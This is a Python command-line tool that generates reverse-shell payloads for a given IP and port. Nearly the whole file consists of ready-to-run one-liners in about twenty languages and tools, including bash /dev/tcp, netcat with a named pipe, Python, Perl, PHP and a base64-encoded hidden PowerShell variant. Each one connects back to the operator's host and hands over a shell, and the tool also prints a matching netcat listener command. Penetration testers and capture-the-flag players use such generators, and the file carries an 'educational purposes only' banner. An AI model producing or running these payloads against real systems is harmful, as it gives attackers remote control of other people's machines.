#!/usr/bin/env python3
"""
Reverse Shell Generator
Generates reverse shell payloads for various languages and platforms
Educational purposes only - Use responsibly and legally
"""

import sys
import base64
import urllib.parse
from typing import Dict, Callable

class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class ReverseShellGenerator:
    def __init__(self, ip: str, port: int):
        self.ip = ip
        self.port = port
        self.shells: Dict[str, Callable[[], str]] = {
            'bash': self.bash_shell,
            'bash_tcp': self.bash_tcp_shell,
            'bash_udp': self.bash_udp_shell,
            'nc': self.netcat_shell,
            'nc_openbsd': self.netcat_openbsd_shell,
            'python': self.python_shell,
            'python3': self.python3_shell,
            'perl': self.perl_shell,
            'php': self.php_shell,
            'ruby': self.ruby_shell,
            'java': self.java_shell,
            'powershell': self.powershell_shell,
            'powershell_base64': self.powershell_base64_shell,
            'nodejs': self.nodejs_shell,
            'socat': self.socat_shell,
            'awk': self.awk_shell,
            'lua': self.lua_shell,
            'golang': self.golang_shell,
            'telnet': self.telnet_shell,
            'xterm': self.xterm_shell,
        }

    def bash_shell(self) -> str:
        """Standard bash reverse shell"""
        return f"bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"

    def bash_tcp_shell(self) -> str:
        """Bash TCP reverse shell (alternative)"""
        return f"0<&196;exec 196<>/dev/tcp/{self.ip}/{self.port}; sh <&196 >&196 2>&196"

    def bash_udp_shell(self) -> str:
        """Bash UDP reverse shell"""
        return f"sh -i >& /dev/udp/{self.ip}/{self.port} 0>&1"

    def netcat_shell(self) -> str:
        """Netcat reverse shell"""
        return f"nc -e /bin/sh {self.ip} {self.port}"

    def netcat_openbsd_shell(self) -> str:
        """Netcat OpenBSD reverse shell (no -e flag)"""
        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.ip} {self.port} >/tmp/f"

    def python_shell(self) -> str:
        """Python 2 reverse shell"""
        return f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.ip}",{self.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""

    def python3_shell(self) -> str:
        """Python 3 reverse shell"""
        return f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.ip}",{self.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""

    def perl_shell(self) -> str:
        """Perl reverse shell"""
        return f"""perl -e 'use Socket;$i="{self.ip}";$p={self.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""

    def php_shell(self) -> str:
        """PHP reverse shell"""
        return f"""php -r '$sock=fsockopen("{self.ip}",{self.port});exec("/bin/sh -i <&3 >&3 2>&3");'"""

    def ruby_shell(self) -> str:
        """Ruby reverse shell"""
        return f"""ruby -rsocket -e'f=TCPSocket.open("{self.ip}",{self.port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""

    def java_shell(self) -> str:
        """Java reverse shell"""
        return f"""r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{self.ip}/{self.port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()"""

    def powershell_shell(self) -> str:
        """PowerShell reverse shell"""
        return f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("{self.ip}",{self.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""

    def powershell_base64_shell(self) -> str:
        """PowerShell reverse shell (base64 encoded)"""
        ps_command = f'$client = New-Object System.Net.Sockets.TCPClient("{self.ip}",{self.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
        encoded = base64.b64encode(ps_command.encode('utf-16le')).decode()
        return f"powershell -e {encoded}"

    def nodejs_shell(self) -> str:
        """Node.js reverse shell"""
        return f"""(function(){{var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect({self.port}, "{self.ip}", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();"""

    def socat_shell(self) -> str:
        """Socat reverse shell"""
        return f"socat TCP:{self.ip}:{self.port} EXEC:/bin/sh"

    def awk_shell(self) -> str:
        """AWK reverse shell"""
        return f"""awk 'BEGIN {{s = "/inet/tcp/0/{self.ip}/{self.port}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }}}} while(c != "exit") close(s); }}}}' /dev/null"""

    def lua_shell(self) -> str:
        """Lua reverse shell"""
        return f"""lua -e "require('socket');require('os');t=socket.tcp();t:connect('{self.ip}','{self.port}');os.execute('/bin/sh -i <&3 >&3 2>&3');" """

    def golang_shell(self) -> str:
        """Golang reverse shell"""
        return f"""echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{self.ip}:{self.port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""

    def telnet_shell(self) -> str:
        """Telnet reverse shell"""
        return f"TF=$(mktemp -u);mkfifo $TF && telnet {self.ip} {self.port} 0<$TF | /bin/sh 1>$TF"

    def xterm_shell(self) -> str:
        """Xterm reverse shell"""
        return f"xterm -display {self.ip}:1"

    def generate(self, shell_type: str) -> str:
        """Generate a specific type of reverse shell"""
        if shell_type not in self.shells:
            raise ValueError(f"Unknown shell type: {shell_type}")
        return self.shells[shell_type]()

    def generate_all(self) -> Dict[str, str]:
        """Generate all available reverse shells"""
        return {name: func() for name, func in self.shells.items()}

    def list_shells(self) -> list:
        """List all available shell types"""
        return sorted(self.shells.keys())


def print_banner():
    """Print ASCII art banner"""
    banner = f"""{Colors.CYAN}
    ╦═╗╔═╗╦  ╦╔═╗╦═╗╔═╗╔═╗  ╔═╗╦ ╦╔═╗╦  ╦  
    ╠╦╝║╣ ╚╗╔╝║╣ ╠╦╝╚═╗║╣   ╚═╗╠═╣║╣ ║  ║  
    ╩╚═╚═╝ ╚╝ ╚═╝╩╚═╚═╝╚═╝  ╚═╝╩ ╩╚═╝╩═╝╩═╝
    ╔═╗╔═╗╔╗╔╔═╗╦═╗╔═╗╔╦╗╔═╗╦═╗
    ║ ╦║╣ ║║║║╣ ╠╦╝╠═╣ ║ ║ ║╠╦╝
    ╚═╝╚═╝╝╚╝╚═╝╩╚═╩ ╩ ╩ ╚═╝╩╚═
    {Colors.RESET}
    {Colors.YELLOW}[!] Educational purposes only - Use responsibly{Colors.RESET}
    """
    print(banner)


def print_usage():
    """Print usage information"""
    usage = f"""
{Colors.BOLD}Usage:{Colors.RESET}
    python revshell.py <IP> <PORT> [SHELL_TYPE]
    python revshell.py <IP> <PORT> --list
    python revshell.py <IP> <PORT> --all

{Colors.BOLD}Examples:{Colors.RESET}
    python revshell.py 10.10.10.5 4444 bash
    python revshell.py 192.168.1.100 9001 python3
    python revshell.py 10.0.0.1 1337 --all

{Colors.BOLD}Arguments:{Colors.RESET}
    IP          - Your listening IP address
    PORT        - Your listening port
    SHELL_TYPE  - Type of reverse shell to generate
    --list      - List all available shell types
    --all       - Generate all available shells
"""
    print(usage)


def main():
    print_banner()

    if len(sys.argv) < 3:
        print_usage()
        sys.exit(1)

    ip = sys.argv[1]
    
    try:
        port = int(sys.argv[2])
    except ValueError:
        print(f"{Colors.RED}[!] Error: Port must be a number{Colors.RESET}")
        sys.exit(1)

    generator = ReverseShellGenerator(ip, port)

    # List available shells
    if len(sys.argv) > 3 and sys.argv[3] == '--list':
        print(f"{Colors.GREEN}[+] Available shell types:{Colors.RESET}\n")
        for shell_type in generator.list_shells():
            print(f"    • {shell_type}")
        print()
        sys.exit(0)

    # Generate all shells
    if len(sys.argv) > 3 and sys.argv[3] == '--all':
        print(f"{Colors.GREEN}[+] Generating all reverse shells for {ip}:{port}{Colors.RESET}\n")
        all_shells = generator.generate_all()
        for name, payload in all_shells.items():
            print(f"{Colors.BOLD}{Colors.BLUE}[{name}]{Colors.RESET}")
            print(f"{payload}\n")
        sys.exit(0)

    # Generate specific shell
    if len(sys.argv) < 4:
        print(f"{Colors.RED}[!] Error: Please specify a shell type or use --list/--all{Colors.RESET}")
        print_usage()
        sys.exit(1)

    shell_type = sys.argv[3]

    try:
        payload = generator.generate(shell_type)
        print(f"{Colors.GREEN}[+] Generated {shell_type} reverse shell for {ip}:{port}{Colors.RESET}\n")
        print(f"{Colors.BOLD}Payload:{Colors.RESET}")
        print(f"{Colors.CYAN}{payload}{Colors.RESET}\n")
        
        print(f"{Colors.YELLOW}[*] Listener command:{Colors.RESET}")
        print(f"{Colors.CYAN}nc -lvnp {port}{Colors.RESET}\n")
        
    except ValueError as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
        print(f"\n{Colors.YELLOW}[*] Use --list to see available shell types{Colors.RESET}")
        sys.exit(1)


if __name__ == "__main__":
    main()
